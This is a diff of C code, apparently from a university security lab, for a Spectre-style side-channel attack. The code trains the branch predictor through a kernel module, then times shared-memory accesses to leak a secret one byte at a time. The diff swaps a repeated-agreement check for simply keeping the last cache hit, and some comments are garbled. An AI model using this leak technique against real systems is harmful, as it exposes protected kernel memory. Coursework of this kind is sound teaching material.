@@ -46,12 +46,11 @@ int run_attacker(int kernel_fd, char *shared_memory) {
     printf("Launching attacker\n");
 
     for (current_offset = 0; current_offset < LAB2_SECRET_MAX_LEN; current_offset++) {
-        char leaked_byte_possible[ITERS] = {0};
         char leaked_byte;
 
 		for (int iters=0; iters < ITERS; ){
 
-			for(int train=0; train<10; train++){								//Trainng: Call kernel vtraincttrainm multtrainple ttrainmes
+			for(int train=0; train<10; train++){							//Trainng: Call kernel vtraincttrainm multtrainple ttrainmes
 				call_kernel_part2(kernel_fd, shared_memory, 0);
 			}
 
@@ -65,29 +64,13 @@ int run_attacker(int kernel_fd, char *shared_memory) {
 				int time_req = 0;
 				time_req = time_access(shared_memory + 4096*block);
 				if (time_req < 170){
-					leaked_byte_possible[iters] = (char)block;
+					leaked_byte = (char)block;
 					iters++;
 				}
 			}
 		}
 
-		bool found = false;
-		int rep = 0;
-		for (int i=0; i<ITERS && !found; i++){
-			for (int j=0; j<ITERS && !found; j++){
-				if (i!=j && i<j){
-					if (leaked_byte_possible[i]==leaked_byte_possible[j]){
-						rep++;
-						if(rep == 3){
-							found = true;
-							leaked_byte = leaked_byte_possible[0];
-							leaked_str[current_offset] = leaked_byte;
-							printf("current_offset: %ld leaked_byte: %c\n", current_offset, leaked_byte);
-						}
-					}
-				}
-			}
-		}
+		leaked_str[current_offset] = leaked_byte;
 
         if (leaked_byte == '\x00') {
             break;
